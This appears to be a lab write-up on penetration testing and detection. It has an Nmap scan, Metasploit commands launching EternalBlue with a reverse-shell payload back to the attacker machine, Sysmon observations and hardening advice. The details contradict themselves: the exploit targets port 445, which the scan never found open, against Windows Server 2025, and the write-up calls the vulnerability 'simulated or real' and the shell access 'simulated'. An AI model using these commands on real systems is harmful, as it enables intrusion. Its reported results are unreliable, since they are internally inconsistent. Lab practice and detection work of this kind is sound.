# 🔎 Network Reconnaissance – Nmap Scan

## 🧠 Objective
Perform a network scan to identify live hosts, open ports, and potential vulnerabilities on the target server in an isolated lab environment.

---

## 🛠️ Tools Used
- `Nmap` v7.94
- Kali Linux 2024.2

---

## 🖥️ Target Information
- IP: `192.168.1.2` (Windows Server 2025)
- Subnet: `192.168.1.0/24`

---

## 🔍 Scan Commands & Results

### 1. Basic Host Discovery

```bash
nmap -sn 192.168.1.0/24
Output:

192.168.1.1 -> Netgear Router

192.168.1.2 -> Windows Server

192.168.1.10 -> Kali Linux

2. Port Scan
bash
Copy
Edit
nmap -sS -Pn -T4 -p- 192.168.1.2
Open Ports:

22 – SSH

80 – HTTP

3389 – RDP

📌 Notes
Windows Defender was active during scanning.

No IDS in place at this stage.

✅ Outcome
Initial footprinting complete. Discovered open ports for potential exploitation in the next phase.

💥 Exploitation – Metasploit CVE
🧠 Objective
Exploit an identified vulnerability on the Windows Server using Metasploit in a safe, controlled environment.

🛠️ Tools Used
Metasploit Framework

Kali Linux 2024.2

🎯 Target
OS: Windows Server 2025

IP: 192.168.1.2

Port: 445 (SMB vulnerability - simulated or real CVE)

🧪 Exploit Example
bash
Copy
Edit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.2
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
run
Simulated successful shell access achieved.

🔒 Mitigation Notes
Ensure server is patched against known SMB vulnerabilities.

Disable unnecessary services (e.g., SMBv1).

✅ Outcome
Exploit successful in lab; documented post-exploitation actions for analysis.

🔍 Post-Exploitation – Sysmon Analysis
🧠 Objective
Analyze system activity using Sysmon logs after a successful exploitation attempt.

🛠️ Tools Used
Sysmon (Windows Server)

Event Viewer & Windows Event Logging

Kali Linux (for attack)

🧾 Key Observations
Event ID 1: Process Creation (cmd.exe, powershell.exe)

Event ID 3: Network Connection established from attacker IP (192.168.1.10)

Event ID 11: File creation in C:\Users\Public

📊 Detection Indicators
Indicator	Value
Source IP	192.168.1.10
Suspicious Process	powershell.exe
Malicious Payload	Meterpreter reverse shell
🛡️ Defensive Recommendations
Create Sysmon alerts for suspicious process chains.

Enable logging for PowerShell and Remote Desktop usage.

Integrate with SIEM for real-time alerting.

✅ Outcome
Sysmon successfully captured key post-exploitation events. Confirmed value in forensic detection.

🧾 Risk Assessment Report
